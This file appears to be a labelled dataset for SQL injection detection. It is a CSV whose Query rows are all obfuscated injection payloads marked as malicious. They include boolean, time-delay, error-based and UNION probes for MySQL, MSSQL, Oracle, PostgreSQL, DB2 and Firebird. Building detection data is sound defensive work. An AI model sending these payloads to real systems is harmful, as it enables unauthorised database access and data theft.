Query,Label
"1'   )    )    as xrre %w%he%r%e 1172  =  1172 %%a%n%d %%upd%a%texml  (  3393,concat  (  0x2e,0x7171706a71,  (  sele%%ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"1'||  (  %%s%el%%ec%t 'yhkt' %%f%rom dual %%wh%%ere 7105  =  7105 %%o%r row  (  1045,7562  )  >  (  %%s%el%%ec%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%el%%ec%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%o%r  (  r%a%nd  (  0  )  *2   )    )   x %%f%rom   (  %%s%el%%ec%t 8488 union %%s%el%%ec%t 5584 union %%s%el%%ec%t 3051 union %%s%el%%ec%t 1210  )  a group b%y x   )    )   ||'",1
"1'   )    )     )   %o%r elt  (  6272  =  6272,sleep  (  5   )    )    a%n%d    (    (     (  'pded'  =  'pded",1
1  )   %%and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%lec%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%and   (  3836  =  3836,1
"1' %%o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    %a%n%d 'ntaw'  =  'ntaw",1
"1%""   )    )    %a%%n%d   (  3020  =  3020  )  *6703 %a%%n%d    (    (   ""%""  =  """,1
1%'   )    )    %a%nd 4595  =  4595#,1
"exp  (  ~  (  sel%%e%%ct * %%fr%%o%%m   (  sel%%e%%ct concat  (  0x7171706a71,  (  sel%%e%%ct   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1   )    )    as avdz %w%%h%e%%r%e 1881  =  1881 %a%nd 6510  =    (  %s%%ele%%ct count  (  *  )   f%%r%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'+  (  s%%e%%l%e%%c%t 'stdl' %wh%e%%r%%e 4581  =  4581,1
1%'   )    )    %%an%d 2006  =  2006,1
"1%""  )   union all %se%%le%%ct %n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l--",1
1   )    )    as dqfl %%wh%%e%%re 7527  =  7527,1
"1' %%i%n boolean mode  )   %or 5356  =    (  s%e%%l%e%%ct count  (  *  )   %f%ro%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )    %a%%n%%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
%se%%l%%e%%c%%t case when 7717  =  7717 then 1 else nul%l end--,1
"1%""  )   %or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %s%%e%%l%e%%c%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%%nd   (  ""%""  =  """,1
"  (  %s%e%l%e%ct * %f%r%om generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   l%im%%i%t 1  )  ",1
"1  )   as vzyk %w%h%%e%r%e 5103  =  5103 %an%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1' %or %u%p%d%%a%%t%%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  %%s%e%le%ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %an%d 'vvkl'  =  'vvkl",1
"1'   )    )    %a%%nd 4241  =  convert  (  int,  (  s%%elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %a%%nd    (    (   'wzrj'  =  'wzrj",1
"1'  )   or row  (  1045,7562  )  >  (  %%s%e%%l%e%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%e%%l%e%%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  r%an%d  (  0  )  *2   )    )   x %%fr%%om   (  %%s%e%%l%e%%c%%t 8488 union %%s%e%%l%e%%c%%t 5584 union %%s%e%%l%e%%c%%t 3051 union %%s%e%%l%e%%c%%t 1210  )  a group by x  )   %an%d   (  'cogk'  =  'cogk",1
"-1692'  )   union all %%s%%e%lec%%t 7074,7074,7074,7074,7074,7074,7074#",1
1'||  (  s%%el%%e%c%t 'nvvm' fr%%o%%m dual wh%%e%r%e 5567  =  5567 rlik%%e   (  s%%el%%e%c%t * fr%%o%%m   (  s%%el%%e%c%t  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1
"1""  )   as sraw %%w%%h%e%%r%e 1997  =  1997 %%and   (  se%%l%e%%c%%t 2*  (  if   (    (   se%%l%e%%c%%t * %f%%r%%om   (  se%%l%e%%c%%t concat  (  0x7171706a71,  (  se%%l%e%%c%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1""  )   whe%%r%e 9248  =  9248",1
"1""  )   %whe%r%e 9855  =  9855",1
"1 %an%d 3707  =    (  %s%el%%ect count  (  *  )   fr%om sysibm.systa%%b%l%es as t1,sysibm.systa%%b%l%es as t2,sysibm.systa%%b%l%es as t3  )  -- xlfz",1
"%se%lect count  (  *  )   f%r%%o%m doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.t%%ab%les as t3 %an%%d    (    (   ""tbcc""  =  ""tbcc",1
-7345  )   union all %%s%%e%%le%c%%t 3866#,1
"1   )    )     )   union all s%%ele%%c%%t %nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l#",1
"1%""   )    )    %a%%nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %a%%nd    (    (   ""%""  =  """,1
1' r%%l%%i%%ke sleep  (  5  )  #,1
"1   )    )    as hrks %%w%%he%r%e 7637  =  7637 %o%r elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1' %%w%%h%e%r%e 8469  =  8469,1
"1'   )    )    %%an%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%%l%%l  )  ,0  )  ,500000000  )  ,n%%u%%l%%l  )   %%an%%d    (    (   'ngwt'  =  'ngwt",1
"1'  )   as pki%%s %w%%h%%e%%r%%e 3446  =  3446 o%%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1"" %%w%her%e 6785  =  6785 %%an%%d 3580  =    (  %se%l%%ec%%t count  (  *  )   f%rom doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%t%a%%bles as t3  )  --",1
"1%'   )    )    %o%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%nu%l%l  )  ,0  )  ,500000000  )  ,%%nu%l%l  )   %an%%d    (    (   '%'  =  '",1
1'  )   %%an%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%e%%lec%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
1' %%in boolean mode  )   r%l%i%%k%e   (  %sele%c%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,1
"s%%e%l%%ec%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",1
"-6440   )    )     )   union all %%s%el%%ec%t 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1
"-9924   )    )    as zgqa %%wh%%e%%r%%e 2867  =  2867 union all se%%le%c%t 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
1  )   as gfhf %%w%%he%r%%e 5804  =  5804 %or 6793  =    (  %%sele%c%t 6793 f%ro%%m pg_sleep  (  5   )    )   --,1
"1""  )   as dgzf %w%he%%r%e 4834  =  4834",1
-4324 %%%o%%rde%%r %%b%%y 1--,1
"-8557 or 1 group %%b%%y concat  (  0x7171706a71,  (  %%selec%%t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  r%%a%%n%d  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
end--,1
"1""   )    )     )   %o%r 8421  =    (  %s%%e%%l%%e%%ct count  (  *  )   fr%%o%m generate_series  (  1,5000000   )    )    a%nd    (    (     (  ""ugtw""  =  ""ugtw",1
1   )    )    rl%%i%ke   (  se%l%ect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a%n%d    (    (   4279  =  4279,1
1%'   )    )    rli%k%e sleep  (  5  )  #,1
"1' %a%n%d 2716  =    (  s%%e%%l%%e%c%%t count  (  *  )   %%fr%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as fwru %%w%her%e 5262  =  5262 a%%n%%d 4241  =  convert  (  i%%nt,  (  %%s%%e%%lec%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%%e%%lec%t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""  )   as xwnu %%wh%ere 6490  =  6490 union all s%%e%%l%%e%%c%t n%ul%%l,n%ul%%l,n%ul%%l,n%ul%%l,n%ul%%l,n%ul%%l--",1
1'  )   as wpmv %w%h%e%%r%%e 1479  =  1479 an%d 3754  =    (  %s%e%lec%%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%lec%%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   f%r%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f%r%o%m dual  )  --,1
"1 and 3202  =  l%%i%%ke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
1' %o%%r   (  se%l%%e%c%t * from   (  se%l%%e%c%t  (  sleep  (  5   )    )     )  ydpu  )   %and 'bwtk'  =  'bwtk,1
"-8754""   )    )     )   union all %s%el%%e%c%%t 7391,7391,7391,7391,7391,7391,7391--",1
"-4406%' union all s%%e%%l%e%c%t 9599,9599,9599,9599#",1
"1  )   as rnfb %%w%%h%%er%e 2405  =  2405 o%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1  )   o%r   (  %s%e%le%%c%%t * from   (  %s%e%le%%c%%t  (  sleep  (  5   )    )     )  sddo  )  #,1
1 %a%nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%sel%ec%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1
"%s%%e%%le%c%t benchmark  (  5000000,md5  (  0x714e4153   )    )   #",1
"1%'  )   %%a%n%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %%a%n%d   (  '%'  =  '",1
"-6550'  )   %w%he%%r%e 1675  =  1675 union all %s%%e%%l%%e%%c%%t 1675,1675,1675,1675,1675,1675,1675--",1
"1'  )   w%%he%re 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
1  )   as uuro wh%%er%%e 6784  =  6784,1
-7720   )    )    %%or 2724 %%in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%e%%l%%e%c%t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an%%d    (    (   8254  =  8254,1
"1   )    )    %an%d row  (  6237,7469  )  >  (  sel%ec%t count  (  *  )  ,concat  (  0x7171706a71,  (  sel%ec%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%%or  (  r%an%d  (  0  )  *2   )    )   x %fr%om   (  sel%ec%t 5192 union sel%ec%t 3785 union sel%ec%t 3931 union sel%ec%t 7158  )  a group b%%y x  )   %an%d    (    (   9325  =  9325",1
"1,  (  %s%%el%%ect   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  %s%%el%%ect 5154 %%fr%om master..sysdat%a%b%a%ses  )   end   )    )   ",1
"-6014"" o%r make_%%s%et  (  3003  =  2609,2609  )  ",1
1  )   %w%%h%%e%re 6424  =  6424,1
1%' %%or sleep  (  5  )  #,1
1' %%o%r sleep  (  5  )   %a%n%%d 'yudo'  =  'yudo,1
1'||  (  se%%l%%e%ct 'sxya' w%h%%e%re 3578  =  3578,1
"1""   )    )     )   o%%r 4411  =    (  %sel%e%c%%t count  (  *  )   fr%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %%a%%n%d    (    (     (  ""nrhz"" %%l%%i%k%e ""nrhz",1
"%s%e%%l%ec%t * %%f%r%o%m generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   %l%i%%m%i%%t 1--",1
"1'  )   %%o%r   (  %%s%%el%e%%c%t 2*  (  if   (    (   %%s%%el%e%%c%t * %%f%%r%o%m   (  %%s%%el%e%%c%t concat  (  0x7171706a71,  (  %%s%%el%e%%c%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %and   (  'lxoc'  =  'lxoc",1
"1' %where 4150  =  4150 a%nd elt  (  8012  =  6026,6026  )  --",1
"1,iif  (  6333  =  1227,1,1/0  )  ",1
"1   )    )    %a%n%%d 8189  =    (  %s%e%l%e%ct count  (  *  )   %f%%r%%om sysibm.sys%t%a%b%l%%es as t1,sysibm.sys%t%a%b%l%%es as t2,sysibm.sys%t%a%b%l%%es as t3  )  --",1
"1""  )   as jqli %%w%he%%r%%e 7793  =  7793",1
1'   )    )     )   %%an%d 6991  =  5579,1
1' o%r 6793  =    (  %%s%%e%l%%e%c%t 6793 fr%o%%m pg_sleep  (  5   )    ) ,1
1 w%h%ere 1568  =  1568 %%o%%r   (  %s%e%%l%%e%ct * fr%%o%%m   (  %s%e%%l%%e%ct  (  sleep  (  5   )    )     )  sddo  )  #,1
"1  )   as idvt %wh%%e%re 3490  =  3490 %%and 9660  =    (  s%%e%l%%ect count  (  *  )   %fr%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" a%nd 8148  =  %l%ike  (  'abcdefg',upper  (  hex  (  ra%ndomblob  (  500000000/2   )    )      )    )   --",1
"1' %w%%h%%e%r%%e 1093  =  1093 union all %%s%e%lec%t nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll--",1
 (  s%e%l%%e%%c%%t * f%r%o%m   (  s%e%l%%e%%c%%t  (  sleep  (  5   )    )     )  acdk  )  #,1
1'+  (  %s%el%%e%ct 'kcix' %%w%%h%%e%%r%e 1117  =  1117,1
1'+  (  sel%ec%t 'jaok' w%%h%%e%re 2592  =  2592,1
"1'   )    )    o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    %%a%%nd    (    (   'ossj'  =  'ossj",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   %a%%nd    (    (     (  'aqdj'  =  'aqdj",1
"1"" and 3202  =  %%l%i%ke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
"call regexp_substr%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%nul%%l  )  ,0  )  ,500000000  )  ,%%nul%%l  )   a%nd   (  ""pdqm"" %%l%%i%%k%%e ""pdqm",1
"1',exp  (  ~  (  se%l%%e%c%t * %%f%r%om   (  se%l%%e%c%t concat  (  0x7171706a71,  (  se%l%%e%c%t   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1""   )    )    as jebl %w%h%er%e 3464  =  3464",1
"-3632' %or make_%%s%e%%t  (  9354  =  9354,7185  )   %%an%d 'lgpy' lik%%e 'lgpy",1
-5147 o%r   (  8459  =  8459  )  *4906,1
"1'   )    )    union all s%e%%l%ec%t %n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll#",1
"1""  )   as bksv %w%he%%r%%e 5375  =  5375",1
"-3017""   )    )    as ljit %%w%h%e%%re 9128  =  9128 union all %%s%%e%%l%%e%ct 9128,9128,9128,9128,9128--",1
"1'   )    )    %or 8384  =  %%l%%i%%k%e  (  'abcdefg',upper  (  hex  (  ra%%ndomblob  (  500000000/2   )    )      )    )    a%%nd    (    (   'dreq'  =  'dreq",1
"1%""  )   rl%i%%k%e   (  selec%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a%%n%%d   (  ""%""  =  """,1
1  )   %wh%er%e 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %s%%e%l%e%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-4371'   )    )     )   union all sel%%e%ct 7465,7465,7465,7465,7465,7465,7465#",1
1  )   and 7533  =  7533,1
"1  )   %%w%%h%e%r%%e 9371  =  9371 union all s%%e%lect %%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l--",1
"1,  (  %%s%e%lect   (  case when   (  3902  =  3902  )   then   (  %%s%e%lect count  (  *  )   %%f%r%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  %%s%e%lect 0 %%f%r%o%%m dual  )   end  )   %%f%r%o%%m dual  )  ",1
1%' union all %%s%e%l%%e%%c%%t %nu%%l%l--,1
"1""   )    )     )   %%a%n%%d 8514  =    (  %sel%%ec%%t count  (  *  )   f%r%%o%m doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.%t%a%bl%%es as t3  )   %%a%n%%d    (    (     (  ""xtyt""  =  ""xtyt",1
"%%s%%el%%e%ct sleep  (  5  )   %a%%n%d    (    (   ""twed"" l%ik%e ""twed",1
1' where 8729  =  8729,1
"1'   )    )    %%a%%n%%d elt  (  4249  =  4249,7259  )   %%a%%n%%d    (    (   'xjns'  =  'xjns",1
"-3667%'   )    )    union all s%%e%%l%ect 3560,3560,3560--",1
"-8655  )   %wh%e%%r%%e 3910  =  3910 union all se%l%%e%%c%t 3910,3910#",1
"waitf%o%r delay '0:0:5' and ""cvqn"" l%ike ""cvqn",1
-5569'  )   as cjaf %%w%h%e%r%e 3753  =  3753 union all %se%l%%e%%ct 3753#,1
1  )   w%h%%e%%r%%e 9078  =  9078 r%l%i%%k%%e sleep  (  5  )  #,1
"1'   )    )    %a%nd 3707  =    (  %%s%%e%%lec%%t count  (  *  )   %fr%%o%m sysibm.syst%ab%les as t1,sysibm.syst%ab%les as t2,sysibm.syst%ab%les as t3  )   %a%nd    (    (   'tkcy' %li%ke 'tkcy",1
-2210' %%o%r 5903  =    (  'qqpjq'||  (  %s%%el%%ec%%t case 5903 when 5903 then 1 else 0 end %%f%r%om rdb$d%at%%a%bas%%e  )  ||'qzvzq'  )   %%a%n%d 'myvr' %%lik%e 'myvr,1
"1%"" union all %%s%e%%le%%ct %%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l--",1
%se%le%%ct   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  %se%le%%ct 1868 %f%ro%%m master..sys%%da%%ta%%b%%a%%ses  )   end  )  --,1
"1'  )   as hlbq %%w%h%e%%re 2347  =  2347 %a%%n%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%ele%ct   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %f%%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1   )    )    %%a%%n%d 8635  =    (  %%s%%e%l%e%c%t count  (  *  )   %fr%om generate_series  (  1,5000000   )    )   --",1
"1'+  (  sele%ct acax %wh%e%r%%e 4169  =  4169 %or 5286  =    (  sele%ct count  (  *  )   %%fr%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
1'   )    )     )   %a%n%%d   (  3020  =  3020  )  *6703 %a%n%%d    (    (     (  'ujds'  =  'ujds,1
1   )    )    as hxtp whe%%re 5478  =  5478 %a%n%%d 8594  =    (  s%el%%e%%c%%t 8594 f%%rom pg_sleep  (  5   )    )   --,1
1   )    )     )   %%a%nd   (  6148  =  3343  )  *3343 %%a%nd    (    (     (  3271  =  3271,1
-7561  )   as ilrm w%%h%%e%r%%e 8828  =  8828 %or 5903  =    (  'qqpjq'||  (  %s%%e%le%%c%%t case 5903 when 5903 then 1 else 0 end %f%%ro%m rdb$d%%a%t%a%%b%as%e  )  ||'qzvzq'  )  --,1
"-7119""  )   %o%%r 5903  =    (  'qqpjq'||  (  s%%e%l%%e%c%%t case 5903 when 5903 then 1 else 0 end f%r%%om rdb$d%%a%%t%a%%ba%%s%%e  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",1
"1%'   )    )    %a%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%ull  )  ,0  )  ,500000000  )  ,n%%ull  )   %a%n%%d    (    (   '%'  =  '",1
1   )    )    %a%n%%d sleep  (  5  )   %a%n%%d    (    (   9084  =  9084,1
"%%s%e%%l%ec%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   %f%r%o%%m dual a%nd 'hvqt'  =  'hvqt",1
%%s%el%e%%ct pg_sleep  (  5  )   an%%d '%'  =  ',1
"1',  (  %%sele%%ct * %f%%r%o%m generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   %%l%imi%%t 1  )  ",1
"1'+  (  se%%l%%e%c%t 'myrb' w%%h%%e%re 3622  =  3622 %and 6510  =    (  se%%l%%e%c%t count  (  *  )   f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
"1  )   w%%h%%e%r%e 5261  =  5261 %an%d elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"-8940""  )   or 4144  =    (  %%s%%e%%le%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%e%%le%c%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fr%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr%o%m dual  )   %%an%%d   (  ""vnuo"" %%lik%e ""vnuo",1
1   )    )     ) ,1
"-4915' union all s%e%%l%%e%c%t 1928,1928,1928,1928#",1
"1' %%i%%n boolean mode  )   union all %s%%e%l%%ec%%t %%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l#",1
"1""   )    )    as casz wher%%e 5921  =  5921 rl%ike   (  %s%e%%lec%%t * fro%%m   (  %s%e%%lec%%t  (  sleep  (  5   )    )     )  vwyq  )  #",1
"-3009'+  (  %s%e%%lec%t 'gqbo' wh%e%r%%e 6915  =  6915 union all %s%e%%lec%t 6915,6915--",1
"1'  )   %%w%%h%er%e 1600  =  1600 o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%u%ll  )  ,0  )  ,500000000  )  ,%%n%u%ll  )  --",1
%s%el%%e%c%t   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  %s%el%%e%c%t 8857 %f%%rom mysql.db  )   end  )  #,1
"1',  (  s%el%e%ct   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substr%i%ng  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,n%u%%l%%l   )    )     )   else 8640/  (  s%el%e%ct 0 %f%%ro%m %i%nformation_schema.system_users  )   end  )   %f%%ro%m %i%nformation_schema.system_users  )  --",1
"1   )    )    %%o%r exp  (  ~  (  %%s%elec%t * f%%r%%o%m   (  %%s%elec%t concat  (  0x7171706a71,  (  %%s%elec%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %%and    (    (   8475  =  8475",1
1%'  )   waitf%%or delay '0:0:5' %an%%d   (  '%'  =  ',1
"-4637' union all %sel%%e%%ct 9361,9361,9361,9361,9361,9361,9361,9361#",1
"1""  )   %%whe%r%e 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%s%e%%l%%ec%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
1'+  (  s%%ele%%c%%t kzgg %%w%%he%%re 5070  =  5070,1
"1'  )   o%r 6979  =  %%li%%ke  (  'abcdefg',upper  (  hex  (  ra%%n%%domblob  (  500000000/2   )    )      )    )   --",1
